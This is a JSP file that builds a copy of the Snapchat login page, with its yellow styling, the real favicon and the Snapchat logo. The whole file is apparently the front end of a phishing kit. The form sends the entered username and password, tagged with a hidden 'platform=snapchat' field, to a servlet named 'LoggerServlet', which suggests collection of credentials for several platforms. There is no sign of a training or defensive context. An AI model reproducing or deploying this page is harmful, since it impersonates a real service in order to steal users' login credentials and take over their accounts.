<%@ page language="java" contentType="text/html; charset=UTF-8"
    pageEncoding="UTF-8"%>
<html>
<head>
    <title>Snapchat Login</title>
    <link rel="icon" href="https://accounts.snapchat.com/favicon.ico">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <style>
        body {
            background-color: #fffc00;
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
        }
        .snap-box {
            background-color: #fff;
            padding: 30px;
            border-radius: 12px;
            width: 320px;
            box-shadow: 0 0 20px rgba(0,0,0,0.15);
            text-align: center;
        }
        .snap-box img {
            width: 60px;
            margin-bottom: 20px;
        }
        input {
            width: 100%;
            padding: 10px;
            margin: 8px 0;
            border: 1px solid #ccc;
            border-radius: 6px;
        }
        button {
            background-color: #fffc00;
            color: #000;
            font-weight: bold;
            padding: 10px;
            border: none;
            width: 100%;
            margin-top: 10px;
            border-radius: 6px;
            cursor: pointer;
        }
        button:hover {
            background-color: #e5df00;
        }
    </style>
</head>
<body>
<div class="snap-box">
    <img src="https://upload.wikimedia.org/wikipedia/en/thumb/c/c4/Snapchat_logo.svg/512px-Snapchat_logo.svg.png" alt="Snapchat">
    <form action="LoggerServlet" method="post">
    <input type="hidden" name="platform" value="snapchat" />
    <input type="text" name="username" placeholder="Phone number, username, or email" required />
    <input type="password" name="password" placeholder="Password" required />
    <button type="submit">Log In</button>
</form>

</div>
</body>
</html>
